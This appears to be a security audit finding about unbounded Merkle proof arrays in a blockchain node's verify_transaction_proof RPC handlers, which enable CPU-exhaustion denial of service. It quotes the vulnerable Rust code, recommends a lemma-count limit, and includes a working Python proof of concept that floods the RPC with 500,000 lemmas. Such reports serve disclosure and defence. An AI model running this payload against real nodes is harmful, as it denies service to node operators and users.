### Title
Unbounded Merkle Proof Iteration in `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC Handlers Enables CPU Exhaustion DoS - (File: `rpc/src/module/chain.rs`)

---

### Summary

The `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC handlers in `rpc/src/module/chain.rs` accept caller-supplied `lemmas` and `indices` arrays of unbounded length and pass them directly into `CBMT::retrieve_leaves` and `MerkleProof::root`, both of which iterate over every element and invoke blake2b hashing per pair. No size limit is enforced on these arrays before computation begins. An unprivileged RPC caller can submit a crafted proof with an arbitrarily large `lemmas` array against any known block hash, forcing the node to perform unbounded CPU-intensive hashing work, exhausting the RPC thread pool and degrading or blocking all other RPC service.

---

### Finding Description

**Root cause — no bound on attacker-supplied proof arrays:**

In `verify_transaction_proof`:

```rust
// rpc/src/module/chain.rs:1948-1961
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices
        .into_iter()
        .map(|index| index.value())
        .collect(),          // ← unbounded Vec<u32>
    tx_proof.proof.lemmas
        .into_iter()
        .map(|lemma| lemma.into())
        .collect(),          // ← unbounded Vec<Byte32>
);

CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
    .and_then(|tx_hashes| {
        merkle_proof.root(&tx_hashes)  // ← iterates all lemmas, hashing each pair
        ...
    })
```

The `MerkleProof` type is `ExMerkleProof<Byte32, MergeByte32>` from the `merkle_cbt` crate. Its `root()` method reconstructs the Merkle root by iterating over every lemma and merging pairs using `MergeByte32::merge`, which calls `new_blake2b()` and performs a full blake2b hash per merge. The number of merge operations scales with `lemmas.len()`.

The `MerkleProof` struct accepted by the RPC is:

```rust
// util/jsonrpc-types/src/blockchain.rs:1381-1388
pub struct MerkleProof {
    pub indices: Vec<Uint32>,   // no max length
    pub lemmas: Vec<H256>,      // no max length
}
```

Neither field has a declared maximum. The handler performs no length check before constructing the `MerkleProof` and invoking `retrieve_leaves` + `root`.

`verify_transaction_and_witness_proof` is worse: it constructs **two** unbounded `MerkleProof` objects and calls `retrieve_leaves` + `root` on each:

```rust
// rpc/src/module/chain.rs:2045-2065
CBMT::retrieve_leaves(block.tx_witness_hashes(), &witnesses_merkle_proof)
    .and_then(|witnesses_hashes| witnesses_merkle_proof.root(&witnesses_hashes))
    .and_then(|witnesses_proof_root| {
        CBMT::retrieve_leaves(block.tx_hashes(), &transactions_merkle_proof)
            .and_then(|tx_hashes| {
                transactions_merkle_proof.root(&tx_hashes)
                ...
            })
    })
```

**Attacker-controlled entry path:**

1. Attacker identifies any valid block hash on the chain (trivially obtained via `get_tip_header` or any block explorer).
2. Attacker crafts a JSON-RPC request to `verify_transaction_proof` with:
   - `block_hash`: a valid block hash (passes the `get_block` lookup)
   - `proof.indices`: `[0]`
   - `proof.lemmas`: an array of N arbitrary 32-byte values (e.g., N = 500,000)
3. The handler fetches the block (succeeds), constructs the `MerkleProof` with N lemmas, then calls `retrieve_leaves` and `root`, performing O(N) blake2b operations synchronously on the RPC thread.
4. The call returns `None` (invalid proof), but only after exhausting CPU for the full N iterations.
5. Repeated concurrent calls saturate the RPC thread pool.

No authentication, no privileged role, and no on-chain state is required. The only precondition is network access to the RPC port and knowledge of one valid block hash.

---

### Impact Explanation

- **CPU exhaustion / RPC DoS**: Each crafted call forces O(N) synchronous blake2b operations on the RPC handler thread. With N = 500,000 lemmas (≈16 MB JSON body, within typical HTTP server limits), a single call can occupy a thread for seconds. Concurrent calls from one or more attackers saturate the thread pool, making the node unresponsive to all other RPC requests including `send_transaction`, `get_block_template`, and monitoring endpoints.
- **No rate limiting or size guard**: There is no per-call lemma count limit, no per-IP rate limit in the RPC layer for this endpoint, and no cycle/time budget for proof verification.
- **Amplification via `verify_transaction_and_witness_proof`**: This variant processes two proofs per call, doubling the work for the same request size.
- **Scope**: Affects any node with the RPC port reachable. Many operators expose the RPC publicly or to semi-trusted networks.

---

### Likelihood Explanation

The RPC endpoint is publicly documented and requires no authentication by default. Any caller who can reach the RPC port can trigger this. The only prerequisite — a valid block hash — is trivially obtained from any public source. The attack requires no on-chain funds, no mining power, and no special knowledge. Exploitation is straightforward with a single HTTP client.

---

### Recommendation

1. **Enforce a maximum lemma and index count** before constructing the `MerkleProof`. A valid CBMT proof for a block with at most `MAX_BLOCK_TRANSACTIONS` transactions requires at most `ceil(log2(MAX_BLOCK_TRANSACTIONS))` lemmas. Reject any proof where `lemmas.len()` or `indices.len()` exceeds this bound.
2. **Add the check at the RPC handler entry point**, before any computation:

```rust
fn verify_transaction_proof(&self, tx_proof: TransactionProof) -> Result<Vec<H256>> {
    const MAX_PROOF_LEMMAS: usize = 32; // log2(max block txs)
    if tx_proof.proof.lemmas.len() > MAX_PROOF_LEMMAS
        || tx_proof.proof.indices.len() > MAX_PROOF_LEMMAS
    {
        return Err(RPCError::invalid_params("proof exceeds maximum size"));
    }
    // ... existing logic
}
```

3. Apply the same guard to `verify_transaction_and_witness_proof` for both `transactions_proof` and `witnesses_proof`.

### Proof of Concept

```python
import json, requests

# Any valid block hash from the chain
block_hash = "0x7978ec7ce5b507cfb52e149e36b1a23f6062ed150503c85bbf825da3599095ed"

# Craft a proof with 500,000 lemmas — forces ~500,000 blake2b calls
lemmas = ["0x" + "aa" * 32] * 500_000

payload = {
    "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {
            "indices": ["0x0"],
            "lemmas": lemmas
        }
    }],
    "id": 1
}

# Each call occupies an RPC thread for seconds; concurrent calls exhaust the pool
response = requests.post("http://localhost:8114", json=payload)
print(response.json())  # Returns "Invalid transaction proof" after full computation
```

The call will return an error (invalid proof) but only after performing all O(N) blake2b merge operations. Sending this concurrently from multiple goroutines/threads will saturate the RPC thread pool and block all other RPC service.

    fn verify_transaction_proof(&self, tx_proof: TransactionProof) -> Result<Vec<H256>> {
        let snapshot = self.shared.snapshot();

        snapshot
            .get_block(&(&tx_proof.block_hash).into())
            .ok_or_else(|| {
                RPCError::invalid_params(format!("Cannot find block {:#x}", tx_proof.block_hash))
            })
            .and_then(|block| {
                let witnesses_root = tx_proof.witnesses_root.into();
                let merkle_proof = MerkleProof::new(
                    tx_proof
                        .proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );

                CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
                    .and_then(|tx_hashes| {
                        merkle_proof
                            .root(&tx_hashes)
                            .and_then(|raw_transactions_root| {
                                if block.transactions_root()
                                    == merkle_root(&[raw_transactions_root, witnesses_root])
                                {
                                    Some(tx_hashes.iter().map(|hash| hash.into()).collect())
                                } else {
                                    None
                                }
                            })
                    })
                    .ok_or_else(|| RPCError::invalid_params("Invalid transaction proof"))
            })
    }

impl Merge for MergeByte32 {
    type Item = Byte32;
    fn merge(left: &Self::Item, right: &Self::Item) -> Self::Item {
        let mut ret = [0u8; 32];
        let mut blake2b = new_blake2b();

        blake2b.update(left.as_slice());
        blake2b.update(right.as_slice());
        blake2b.finalize(&mut ret);
        ret.into()
    }
